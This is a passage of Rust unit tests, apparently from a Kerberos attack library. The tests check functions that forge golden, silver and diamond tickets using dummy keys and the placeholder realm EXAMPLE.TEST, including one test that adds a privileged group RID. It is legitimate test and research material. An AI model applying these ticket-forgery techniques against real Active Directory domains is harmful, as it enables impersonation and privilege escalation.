            let ticket = forge_golden_ticket(&identity(), &options(), &key).unwrap();
            let encrypted = decrypt_ticket_part(&ticket.ticket, &key).unwrap();
            assert_eq!(principal_name(&encrypted.0.cname.0), "alice");
            assert_eq!(encrypted.0.crealm.0.0.to_string(), "EXAMPLE.TEST");
            assert!(extract_pac(&encrypted).is_ok());
        }
    }

    #[test]
    fn silver_ticket_uses_exact_service_principal() {
        let key = TicketConstructionKey::Aes256([0x44; 32]);
        let ticket = forge_silver_ticket(
            &identity(),
            &options(),
            "cifs/files.example.test",
            &key,
            &key,
        )
        .unwrap();
        assert_eq!(ticket.service_principal_name(), "cifs/files.example.test");
        let encrypted = decrypt_ticket_part(&ticket.ticket, &key).unwrap();
        assert_eq!(principal_name(&encrypted.0.cname.0), "alice");
    }

    #[test]
    fn construction_rejects_mixed_pac_key_profiles_and_bad_lifetimes() {
        let rc4 = TicketConstructionKey::Rc4([0x11; 16]);
        let aes = TicketConstructionKey::Aes128([0x22; 16]);
        assert!(forge_silver_ticket(&identity(), &options(), "cifs/server", &rc4, &aes).is_err());
        let mut invalid = options();
        invalid.lifetime.valid_until_unix = invalid.lifetime.valid_from_unix;
        assert!(forge_golden_ticket(&identity(), &invalid, &rc4).is_err());
        let mut invalid_sid = identity();
        invalid_sid.domain_sid = "S-1-5-32-544".to_owned();
        assert!(forge_golden_ticket(&invalid_sid, &options(), &rc4).is_err());
        assert_eq!(format!("{rc4:?}"), "TicketConstructionKey::Rc4([REDACTED])");
    }

    #[test]
    fn diamond_ticket_preserves_template_session_and_lifetime() {
        let key = TicketConstructionKey::Rc4([0x55; 16]);
        let template = forge_golden_ticket(&identity(), &options(), &key).unwrap();
        let original_session = template.session_key.clone();
        let mut elevated = identity();
        elevated.group_rids.push(518);
        let diamond = forge_diamond_ticket(&template, &elevated, &key).unwrap();
        assert_eq!(diamond.session_key, original_session);
        assert_eq!(diamond.valid_until_unix(), template.valid_until_unix());
        assert_eq!(diamond.ticket_flags(), template.ticket_flags());
        let encrypted = decrypt_ticket_part(&diamond.ticket, &key).unwrap();
        assert_eq!(principal_name(&encrypted.0.cname.0), "alice");
        assert!(extract_pac(&encrypted).is_ok());
    }

    fn extract_pac(ticket: &EncTicketPart) -> Result<Vec<u8>, KerberosError> {
        let outer = ticket.0.authorization_data.0.as_ref().ok_or_else(|| {
            KerberosError::InvalidMessage("missing authorization data".to_owned())
        })?;
        let relevant =
            outer.0.0.first().ok_or_else(|| {
                KerberosError::InvalidMessage("missing AD-IF-RELEVANT".to_owned())
            })?;
        let inner: AuthorizationData = picky_asn1_der::from_bytes(&relevant.ad_data.0.0)
            .map_err(|error| KerberosError::InvalidMessage(error.to_string()))?;
        inner
            .0
            .first()
            .map(|entry| entry.ad_data.0.0.clone())
            .ok_or_else(|| KerberosError::InvalidMessage("missing PAC".to_owned()))
    }
}
